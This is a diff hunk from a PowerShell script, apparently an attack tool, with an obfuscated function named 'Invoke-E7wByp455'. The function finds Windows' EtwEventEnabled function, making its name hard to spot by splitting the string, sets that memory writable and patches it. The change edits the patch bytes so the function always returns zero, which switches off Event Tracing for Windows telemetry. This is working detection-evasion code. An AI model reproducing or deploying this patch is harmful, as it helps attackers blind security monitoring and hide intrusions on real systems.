@@ -51,7 +51,7 @@ function Invoke-E7wByp455{
 		$Address = [Win32Etw]::gpa($LoadLibrary, "Etw" + "Event" + "Enabled")
 		$p = 0
 		[Win32Etw]::vp($Address, [uint32]3, 0x40, [ref]$p)
-		$Patch = [Byte[]] (0xB0,0x01,0xC3)
+		$Patch = [Byte[]] (0xB0,0x00,0xC3)
 		[Win32Etw]::WriteToMemory($patch, $address)
     }
 }
